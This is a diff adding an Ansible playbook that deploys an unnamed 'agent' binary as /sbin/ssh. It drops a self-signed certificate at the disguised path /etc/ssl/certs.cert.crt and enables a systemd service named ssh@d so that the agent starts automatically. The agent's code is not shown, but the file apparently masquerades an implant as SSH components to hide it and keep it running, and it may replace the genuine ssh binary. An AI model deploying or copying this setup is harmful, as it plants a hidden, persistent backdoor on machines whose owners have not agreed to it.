@@ -1,0 +1,33 @@
+---
+- name: Ensure agent directory exists
+  ansible.builtin.file:
+    path: "/sbin/"
+    state: directory
+    mode: '0755'
+
+- name: Copy Linux agent binary
+  ansible.builtin.copy:
+    src: "ssh"
+    dest: "/sbin/ssh"
+    mode: '0755'
+
+- name: Copy certificate
+  ansible.builtin.copy:
+    src: "linux-selfsigned.crt"
+    dest: "/etc/ssl/certs.cert.crt"
+    mode: '0644'
+
+- name: Install systemd service
+  ansible.builtin.template:
+    src: agent.service.j2
+    dest: "/etc/systemd/system/ssh@d.service"
+
+- name: Reload systemd
+  ansible.builtin.systemd:
+    daemon_reload: true
+
+- name: Enable and start service
+  ansible.builtin.systemd:
+    name: "ssh@d"
+    state: restarted
+    enabled: true
